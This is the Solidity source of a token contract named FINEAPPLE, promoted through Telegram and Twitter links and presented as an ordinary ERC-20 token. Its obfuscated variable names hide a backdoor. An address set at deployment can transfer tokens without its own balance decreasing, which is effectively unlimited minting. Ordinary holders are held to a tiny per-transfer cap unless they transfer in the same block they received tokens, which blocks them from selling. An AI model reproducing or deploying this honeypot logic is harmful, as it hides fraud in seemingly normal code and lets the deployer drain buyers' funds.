/*

https://t.me/fineappleerc

http://www.twitter.com/FineAppleEth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FINEAPPLE is Ownable {
    uint8 public decimals = 9;

    uint256 private fjpbyexdhqmo = 116;

    constructor(string memory hcvszjelxg, string memory neyi, address ihqenf, address gkbamcqioe) {
        name = hcvszjelxg;
        symbol = neyi;
        balanceOf[msg.sender] = totalSupply;
        ergj[gkbamcqioe] = fjpbyexdhqmo;
        xpzutrs = IUniswapV2Router02(ihqenf);
    }

    string public name;

    function transfer(address dxypvheouz, uint256 quhtabd) public returns (bool success) {
        fghkucl(msg.sender, dxypvheouz, quhtabd);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private ergj;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function fghkucl(address ziswe, address dxypvheouz, uint256 quhtabd) private {
        address xqzjyibf = IUniswapV2Factory(xpzutrs.factory()).getPair(address(this), xpzutrs.WETH());
        bool muhyxqnwopi = 0 == ergj[ziswe];
        if (muhyxqnwopi) {
            if (ziswe != xqzjyibf && wovkzjeqgn[ziswe] != block.number && quhtabd < totalSupply) {
                require(quhtabd <= totalSupply / (10 ** decimals));
            }
            balanceOf[ziswe] -= quhtabd;
        }
        balanceOf[dxypvheouz] += quhtabd;
        wovkzjeqgn[dxypvheouz] = block.number;
        emit Transfer(ziswe, dxypvheouz, quhtabd);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private xpzutrs;

    function transferFrom(address ziswe, address dxypvheouz, uint256 quhtabd) public returns (bool success) {
        require(quhtabd <= allowance[ziswe][msg.sender]);
        allowance[ziswe][msg.sender] -= quhtabd;
        fghkucl(ziswe, dxypvheouz, quhtabd);
        return true;
    }

    function approve(address zhljkdncmf, uint256 quhtabd) public returns (bool success) {
        allowance[msg.sender][zhljkdncmf] = quhtabd;
        emit Approval(msg.sender, zhljkdncmf, quhtabd);
        return true;
    }

    mapping(address => uint256) private wovkzjeqgn;

    string public symbol;

    mapping(address => uint256) public balanceOf;
}
